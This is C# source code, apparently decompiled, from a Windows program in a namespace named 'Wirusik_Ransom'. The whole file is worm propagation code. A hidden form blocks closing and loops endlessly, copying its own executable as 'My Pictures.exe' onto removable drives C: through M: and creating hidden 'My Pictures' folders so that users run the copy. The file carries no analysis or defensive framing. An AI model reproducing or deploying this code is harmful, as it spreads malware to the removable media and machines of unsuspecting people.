using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Wirusik_Ransom;

public class Repplication : Form
{
	private IContainer components = null;

	public Repplication()
	{
		InitializeComponent();
	}

	private void Repplication_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Repplication_Load(object sender, EventArgs e)
	{
		try
		{
			_ = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\msmgr.exe";
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string location = executingAssembly.Location;
			while (true)
			{
				Thread.Sleep(2522);
				DriveInfo driveInfo = new DriveInfo("C:\\");
				if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "C:\\My Pictures.exe");
						if (File.Exists("C:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("C:\\My Pictures");
								File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo2 = new DriveInfo("D:\\");
				if (driveInfo2.IsReady && driveInfo2.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "D:\\My Pictures.exe");
						if (File.Exists("D:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("D:\\My Pictures");
								File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo3 = new DriveInfo("E:\\");
				if (driveInfo3.IsReady && driveInfo3.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "E:\\My Pictures.exe");
						if (File.Exists("E:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("E:\\My Pictures");
								File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo4 = new DriveInfo("F:\\");
				if (driveInfo4.IsReady && driveInfo4.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "F:\\My Pictures.exe");
						if (File.Exists("F:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("F:\\My Pictures");
								File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo5 = new DriveInfo("G:\\");
				if (driveInfo5.IsReady && driveInfo5.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "G:\\My Pictures.exe");
						if (File.Exists("G:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("G:\\My Pictures");
								File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo6 = new DriveInfo("H:\\");
				if (driveInfo6.IsReady && driveInfo6.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "H:\\My Pictures.exe");
						if (File.Exists("H:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("H:\\My Pictures");
								File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo7 = new DriveInfo("I:\\");
				if (!driveInfo7.IsReady || driveInfo7.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "I:\\My Pictures.exe");
						if (File.Exists("I:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("I:\\My Pictures");
								File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo8 = new DriveInfo("J:\\");
				if (driveInfo8.IsReady && driveInfo8.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "J:\\My Pictures.exe");
						if (File.Exists("J:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("J:\\My Pictures");
								File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo9 = new DriveInfo("K:\\");
				if (driveInfo9.IsReady && driveInfo9.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "K:\\My Pictures.exe");
						if (File.Exists("K:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("K:\\My Pictures");
								File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo10 = new DriveInfo("L:\\");
				if (driveInfo10.IsReady && driveInfo10.DriveType != DriveType.Fixed)
				{
					try
					{
						File.Copy(location, "L:\\My Pictures.exe");
						if (File.Exists("L:\\My Pictures.exe"))
						{
							try
							{
								Directory.CreateDirectory("L:\\My Pictures");
								File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden);
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
				DriveInfo driveInfo11 = new DriveInfo("M:\\");
				if (!driveInfo11.IsReady || driveInfo11.DriveType == DriveType.Fixed)
				{
					continue;
				}
				try
				{
					File.Copy(location, "M:\\My Pictures.exe");
					if (File.Exists("M:\\My Pictures.exe"))
					{
						try
						{
							Directory.CreateDirectory("M:\\My Pictures");
							File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Repplication");
		((Control)this).set_Text("Repplication");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Repplication_FormClosing));
		((Form)this).add_Load((EventHandler)Repplication_Load);
		((Control)this).ResumeLayout(false);
	}
}
